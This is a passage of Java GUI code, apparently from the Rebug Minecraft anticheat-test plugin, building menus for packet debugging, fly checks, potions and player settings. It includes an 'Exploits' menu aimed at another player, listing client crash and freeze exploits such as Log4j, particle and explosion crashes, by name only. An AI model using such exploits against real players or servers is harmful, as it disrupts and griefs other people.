	    		itemMeta.setDisplayName((user.TabCompletePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInTabComplete");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.TabCompletePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			
			break;
		
		case "vanilla fly checks":
			if (itemName.equalsIgnoreCase("1.8.x"))
			{
				user.Vanilla1_8FlyCheck =! user.Vanilla1_8FlyCheck;
				item = Reset(user.Vanilla1_8FlyCheck ? Material.BAKED_POTATO : Material.POTATO_ITEM);
				itemMeta.setDisplayName(ChatColor.ITALIC + "1.8.x");
				lore.add(ChatColor.AQUA + "Status: " + (user.Vanilla1_8FlyCheck ? ChatColor.GREEN : ChatColor.DARK_RED) + user.Vanilla1_8FlyCheck);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable 1.8.x Fly check");
				lore.add(ChatColor.AQUA + "In Development!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("1.9+"))
			{
				user.Vanilla1_9FlyCheck =! user.Vanilla1_9FlyCheck;
				item = Reset(user.Vanilla1_9FlyCheck ? Material.BAKED_POTATO : Material.POTATO_ITEM);
				itemMeta.setDisplayName(ChatColor.ITALIC + "1.9+");
				lore.add(ChatColor.AQUA + "Status: " + (user.Vanilla1_9FlyCheck ? ChatColor.GREEN : ChatColor.DARK_RED) + user.Vanilla1_9FlyCheck);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable 1.9+ Fly check");
				lore.add(ChatColor.AQUA + "In Development!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				return item;
			}
			break;
			
		default:
			break;
		}
		return null;
	}
	@Override
	public void SetUpMenu(User user, String menu) 
	{
		if (user == null || PTNormal.isStringNull(menu))
			return;
		
		switch (menu.toLowerCase())
		{
		case "exploits menu":
			if (user.ExploitsMenu == null)
			{
				if (user.getCommandTarget(true) == null)
				{
					user.sendMessage("Your Command Target was null so they must of left the server!");
					return;
				}
				User used = Rebug.getUser(user.getCommandTarget(false));
	    		Inventory inventory = PTNormal.createInventory(user.getPlayer(), 54, ChatColor.DARK_RED + "Exploits");
	    		item = getMadeItems("%user-info%", used);
				inventory.setItem(0, item);
				
				// Exploits
				
				item = Reset(Material.DEAD_BUSH);
				itemMeta.setDisplayName(ChatColor.RED + "Fake Death");
				lore.add("Fake Death Exploit!");
				lore.add("Makes the client");
				lore.add("think the player");
				lore.add("died but didn't");
				lore.add("and is now bugged");
				lore.add("out and can't respawn");
				lore.add("");
				lore.add("Works on " + ChatColor.DARK_RED + "1.8.x-1.20.4");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(1, item);
				
				item = Reset(Material.BED);
				itemMeta.setDisplayName(ChatColor.RED + "Force Sleep");
				lore.add("Force Sleep Exploit!");
				lore.add("works like the fake death exploit but with bed");
				lore.add("you can't get out of the bed and do anything!");
				lore.add("");
				lore.add("Works on " + ChatColor.DARK_RED + "1.8.x-1.20.4");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(2, item);
				
				item = Reset(Material.ANVIL);
				itemMeta.setDisplayName(ChatColor.RED + "Demo");
				lore.add("Demo Exploit!");
				lore.add("Makes the players game");
				lore.add("think it's a demo!");
				lore.add("");
				lore.add("Works on " + ChatColor.DARK_RED + "1.8.x-1.20.4");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(3, item);
				
				item = Reset(Material.DROPPER);
				itemMeta.setDisplayName(ChatColor.RED + "ResourcePack");
				lore.add("Test Exploit!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(4, item);
				
				item = Reset(Material.CHEST);
				itemMeta.setDisplayName(ChatColor.RED + "Test Exploit");
				lore.add("Test Exploit!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(5, item);
				
				item = Reset(Material.ARMOR_STAND);
				itemMeta.setDisplayName(ChatColor.RED + "Spawn Player");
				lore.add("Spawn Player Exploit!");
				lore.add("Freezes the player and stops");
				lore.add("them from being able");
				lore.add("to move!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(6, item);
				
				
				
				// Crash Exploits
				
				item = Reset(Material.CLAY);
				itemMeta.setDisplayName(ChatColor.RED + "GameState Crash");
				lore.add("GameState Exploit!");
				lore.add("Crashes the client");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(7, item);
				
				item = Reset(Material.TNT);
				itemMeta.setDisplayName(ChatColor.RED + "Explosion Crash");
				lore.add("Explosion Exploit!");
				lore.add("Crashes the client");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(8, item);
				
				item = Reset(Material.COMMAND);
				itemMeta.setDisplayName(ChatColor.RED + "NumbWare Crash");
				lore.add("NumbWare Client");
				lore.add("Crasher");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(9, item);
				
				item = Reset(Material.FIREWORK);
				itemMeta.setDisplayName(ChatColor.RED + "Particle Crash");
				lore.add("Particle Exploit!");
				lore.add("crashes the client");
				lore.add("");
				lore.add("Works on " + ChatColor.DARK_RED + "1.8.x-1.20.4");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(10, item);
				
				item = Reset(Material.COMMAND);
				itemMeta.setDisplayName(ChatColor.RED + "Log4j Crash");
				lore.add("Log4j Exploit");
				lore.add("crashes the client");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(11, item);
				
				item = Reset(Material.PISTON_BASE);
				itemMeta.setDisplayName(ChatColor.RED + "illegal Position Crash");
				lore.add("illegal Position Exploit!");
				lore.add("Crashes the client");
				lore.add("");
				lore.add("Works on " + ChatColor.DARK_RED + "1.8.x-1.20.4");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(12, item);
				
				item = Reset(Material.POTION);
				itemMeta.setDisplayName(ChatColor.RED + "illegal Effect Crash");
				lore.add("illegal Effect Exploit!");
				lore.add("Crashes the client and server if there's no anticrasher!");
				lore.add("rebug will have a anticrasher at some point!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(13, item);
				
				item = Reset(Material.DROPPER);
				itemMeta.setDisplayName(ChatColor.RED + "ResourcePack Crash");
				lore.add("ResourcePack Exploit!");
				lore.add("Crashes the client");
				lore.add("");
				lore.add("Works on " + ChatColor.DARK_RED + "1.8.x");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(14, item);
				
				
				item = Reset(Material.BEDROCK);
				itemMeta.setDisplayName(ChatColor.RED + "Test Crash");
				lore.add("Test Exploit");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(15, item);
				
				
				item = Reset(new ItemStack(Material.SKULL_ITEM, 1, (short) 4));
				itemMeta.setDisplayName(ChatColor.RED + "Spawn Creeper Crash");
				lore.add("Creeper Crash Exploit!");
				lore.add("");
				lore.add("Works on " + ChatColor.DARK_RED + "1.8.x");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(16, item);
				
				
				for (int i = 0; i < inventory.getSize(); i ++)
				{
					if (inventory.getItem(i) == null)
					{
						item = Reset(Material.STAINED_GLASS_PANE, 1, (short) 0, (byte) 7);
						itemMeta.setDisplayName(" ");
						item.setItemMeta(itemMeta);
						inventory.setItem(i, item);
					}
				}
				user.ExploitsMenu = inventory;
			}
			break;
		
		case "packetdebugger menu":
			if (user.PacketDebuggerMenu == null)
			{
				Inventory inventory = PTNormal.createInventory(user.getPlayer(), 36, ChatColor.GREEN + "Packet Selector");
	    		item = Reset(user.FlyingPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.FlyingPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInFlying");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.FlyingPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(0, item);
	    		
	    		item = Reset(user.PositionPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.PositionPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInPosition");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.PositionPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(1, item);
	    		
	    		item = Reset(user.PositionLookPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.PositionLookPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInPositionLook");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.PositionLookPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(2, item);
	    		
	    		item = Reset(user.LookPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.LookPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInLook");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.LookPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(3, item);
	    		
	    		item = Reset(user.ArmAnimationPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.ArmAnimationPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInArmAnimation");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.ArmAnimationPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(4, item);
	    		
	    		item = Reset(user.HeldItemSlotPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.HeldItemSlotPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInHeldItemSlot");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.HeldItemSlotPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(5, item);
	    		
	    		item = Reset(user.DiggingPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.DiggingPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInBlockDig");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.DiggingPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(6, item);
	    		
	    		item = Reset(user.BlockPlacePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.BlockPlacePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInBlockPlacement");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.BlockPlacePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(7, item);
	    		
	    		item = Reset(user.EntityActionPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.EntityActionPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInEntityAction");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.EntityActionPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(8, item);
	    		
	    		item = Reset(user.CloseWindowPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.CloseWindowPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInCloseWindow");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.CloseWindowPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(9, item);
	    		
	    		item = Reset(user.ClickWindowPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.ClickWindowPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInClickWindow");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.ClickWindowPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(10, item);
	    		
	    		item = Reset(user.SettingsPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.SettingsPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInSettings");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.SettingsPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(11, item);
	    		
	    		item = Reset(user.StatusPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.StatusPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInClientStatus");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.StatusPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(12, item);
	    		
	    		
	    		item = Reset(user.AbilitiesPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.AbilitiesPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInAbilities");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.AbilitiesPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(13, item);
	    		
	    		item = Reset(user.KeepAlivePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.KeepAlivePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInKeepAlive");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.KeepAlivePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(14, item);
	    		
	    		item = Reset(user.TransactionPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.TransactionPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInTransaction");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.TransactionPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(15, item);
	    		
	    		item = Reset(user.SpectatePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.SpectatePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInSpectate");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.SpectatePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(16, item);
	    		
	    		item = Reset(user.SteerVehiclePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.SteerVehiclePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInSteerVehicle");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.SteerVehiclePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(17, item);
	    		
	    		item = Reset(user.CustomPayLoadPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.CustomPayLoadPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInCustomPayLoad");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.CustomPayLoadPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(17, item);
	    		
	    		item = Reset(user.TabCompletePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.TabCompletePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInTabComplete");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.TabCompletePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		inventory.setItem(18, item);
				user.PacketDebuggerMenu = inventory;
			}
			break;
			
		case "vanilla fly checks menu":
			if (user.VanillaFlyChecksMenu == null)
			{
				Inventory inventory = PTNormal.createInventory(user.getPlayer(), 9, ChatColor.BLUE + "Vanilla Fly Checks");
				item = Reset(Material.COMMAND);
				itemMeta.setDisplayName(ChatColor.RED.toString() + ChatColor.ITALIC + "Back");
				lore.add(ChatColor.AQUA + "Go back!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(0, item);
				
				item = Reset(Material.BOOK_AND_QUILL);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Notify On Flying Kick 1.8.x");
				lore.add(ChatColor.AQUA + "Status: " + (user.NotifyFlyingKick1_8 ? ChatColor.GREEN : ChatColor.DARK_RED) + user.NotifyFlyingKick1_8);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable alerts");
				lore.add(ChatColor.RESET + "for you being picked up for");
				lore.add(ChatColor.RESET + "flying by vanilla 1.8.x");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(1, item);
				
				item = Reset(Material.BOOK_AND_QUILL);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Notify On Flying Kick 1.9+");
				lore.add(ChatColor.AQUA + "Status: " + (user.NotifyFlyingKick1_9 ? ChatColor.GREEN : ChatColor.DARK_RED) + user.NotifyFlyingKick1_9);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable alerts");
				lore.add(ChatColor.RESET + "for you being picked up for");
				lore.add(ChatColor.RESET + "flying by vanilla 1.9+");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(2, item);
				
				item = Reset(user.Vanilla1_8FlyCheck ? Material.BAKED_POTATO : Material.POTATO_ITEM);
				itemMeta.setDisplayName(ChatColor.ITALIC + "1.8.x");
				lore.add(ChatColor.AQUA + "Status: " + (user.Vanilla1_8FlyCheck ? ChatColor.GREEN : ChatColor.DARK_RED) + user.Vanilla1_8FlyCheck);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable 1.8.x Fly check");
				lore.add(ChatColor.AQUA + "In Development!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(3, item);
				
				item = Reset(user.Vanilla1_9FlyCheck ? Material.BAKED_POTATO : Material.POTATO_ITEM);
				itemMeta.setDisplayName(ChatColor.ITALIC + "1.9+");
				lore.add(ChatColor.AQUA + "Status: " + (user.Vanilla1_9FlyCheck ? ChatColor.GREEN : ChatColor.DARK_RED) + user.Vanilla1_9FlyCheck);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable 1.9+ Fly check");
				lore.add(ChatColor.AQUA + "In Development!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(4, item);
				
				
				for (int i = 0; i < inventory.getSize(); i ++)
				{
					if (inventory.getItem(i) == null)
					{
						item = Reset(Material.STAINED_GLASS_PANE, 1, (short) 0, (byte) 1);
						itemMeta.setDisplayName(ChatColor.RED + "Add more Checks as they come!");
						item.setItemMeta(itemMeta);
						inventory.setItem(i, item);
					}
				}
				user.VanillaFlyChecksMenu = inventory;
			}
			break;
			
		case "potions menu":
			if (user.PotionsMenu == null)
			{
				Inventory inventory = PTNormal.createInventory(user.getPlayer(), 18, ChatColor.RED + "Potions");
				int add = 0;
				
				for (PotionType pots : PotionType.values())
				{
					Potion pot = new Potion(pots);
					if (pots != null && !pots.name().equalsIgnoreCase("water") && pot != null)
					{
						item = Reset(pot.toItemStack(1));
						String name = pot.getType().name().replace(" ", "_").toLowerCase();
						name = name.replace("jump", "jump_boost").replace("instant_heal", "instant_health").replace("regen", "regeneration");
						itemMeta.setDisplayName(ChatColor.GREEN + name);
						item.setItemMeta(itemMeta);
						inventory.setItem(add++, item);
					}
				}
				item = Reset(Material.POTION, 1, (short) 0, (byte) 16387);
				itemMeta.setDisplayName(ChatColor.GREEN + "resistance");
				item.setItemMeta(itemMeta);
				inventory.setItem(13, item);
				
				item = Reset(Material.MILK_BUCKET);
				lore.add("Clear potion effects");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(17, item);
				
				
				for (int i = 0; i < inventory.getSize(); i ++)
				{
					ItemStack item = inventory.getItem(i);
					if (item != null && item.getType() != Material.MILK_BUCKET)
					{
						this.item = Reset(item);
						lore.add(ChatColor.BLUE + "Seconds: " + user.potion_effect_seconds);
						lore.add(ChatColor.BLUE + "Level: " + user.potionlevel);
						lore.add("");
						lore.add(ChatColor.BLUE + "Use /potion");
						lore.add(ChatColor.BLUE + "To change potion settings!");
						itemMeta.setLore(lore);
						this.item.setItemMeta(itemMeta);
					}
				}
				user.PotionsMenu = inventory;
			}
			break;
			
		case "player settings":
			if (user.SettingsMenu == null)
			{
				Inventory inventory = PTNormal.createInventory(user.getPlayer(), 45, ChatColor.BLUE + "Player Settings");
				item = Reset(Material.COOKED_BEEF);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Hunger");
				lore.add(ChatColor.AQUA + "Status: " + (user.Hunger ? ChatColor.GREEN : ChatColor.DARK_RED) + user.Hunger);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Hunger");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(0, item);
				
				item = Reset(Material.FEATHER);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Fall Damage");
				lore.add(ChatColor.AQUA + "Status: " + (user.FallDamage ? ChatColor.GREEN : ChatColor.DARK_RED) + user.FallDamage);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Fall Damage");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(1, item);
				
				item = Reset(Material.ARROW);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Exterranl Damage");
				lore.add(ChatColor.AQUA + "Status: " + (user.Exterranl_Damage ? ChatColor.GREEN : ChatColor.DARK_RED) + user.Exterranl_Damage);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Exterranl Damage");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(2, item);
				
				
				item = Reset(Material.ARMOR_STAND);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Damage Resistance");
				lore.add(ChatColor.AQUA + "Status: " + (user.Damage_Resistance ? ChatColor.GREEN : ChatColor.DARK_RED) + user.Damage_Resistance);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Damage Resistance");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(3, item);
				
				
				item = Reset(Material.FIREBALL);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Fire Resistance");
				lore.add(ChatColor.AQUA + "Status: " + (user.Fire_Resistance ? ChatColor.GREEN : ChatColor.DARK_RED) + user.Fire_Resistance);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Fire Resistance");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(4, item);
				
				item = Reset(Material.COMMAND);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Vanilla Fly Checks");
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Vanilla Fly Checks");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(5, item);
				
				item = Reset(Material.POTION);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Potions");
				lore.add(ChatColor.AQUA + "Status: " + (user.PotionEffects ? ChatColor.GREEN : ChatColor.DARK_RED) + user.PotionEffects);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Potion Effects");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(6, item);
				
				item = Reset(Material.STONE);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Auto Refill Blocks");
				lore.add(ChatColor.AQUA + "Status: " + (user.AutoRefillBlocks ? ChatColor.GREEN : ChatColor.DARK_RED) + user.AutoRefillBlocks);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Auto Block Refill");
				lore.add(ChatColor.RESET + "for Scaffold Test Area");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(7, item);
				
				item = Reset(Material.DISPENSER);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Infinite Blocks");
				lore.add(ChatColor.AQUA + "Status: " + (user.Infinite_Blocks ? ChatColor.GREEN : ChatColor.DARK_RED) + user.Infinite_Blocks);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable blocks you place being Infinite!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(8, item);
				
				item = Reset(Material.PAPER);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Allow Mentions");
				lore.add(ChatColor.AQUA + "Status: " + (user.AllowMentions ? ChatColor.GREEN : ChatColor.DARK_RED) + user.AllowMentions);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Stop's you seeing other players chat messages that mention you");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(9, item);
				
				item = Reset(Material.BANNER);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Flags");
				lore.add(ChatColor.AQUA + "Status: " + (user.ShowFlags ? ChatColor.GREEN : ChatColor.DARK_RED) + user.ShowFlags);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Show anticheat flags");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(10, item);
				
				
				item = Reset(Material.BANNER);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Punishes");
				lore.add(ChatColor.AQUA + "Status: " + (user.ShowPunishes ? ChatColor.GREEN : ChatColor.DARK_RED) + user.ShowPunishes);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Show anticheat alerts for you were/would of been Punished");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(11, item);
				
				
				item = Reset(Material.BANNER);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Setbacks");
				lore.add(ChatColor.AQUA + "Status: " + (user.ShowSetbacks ? ChatColor.GREEN : ChatColor.DARK_RED) + user.ShowSetbacks);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Show anticheat alerts for you were/would of been Setback");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(12, item);
				
				
				item = Reset(Material.ANVIL);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Kick");
				lore.add(ChatColor.AQUA + "Status: " + (user.AntiCheatKick ? ChatColor.GREEN : ChatColor.DARK_RED) + user.AntiCheatKick);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable anticheat kicks");
				itemMeta.setLore(lore);
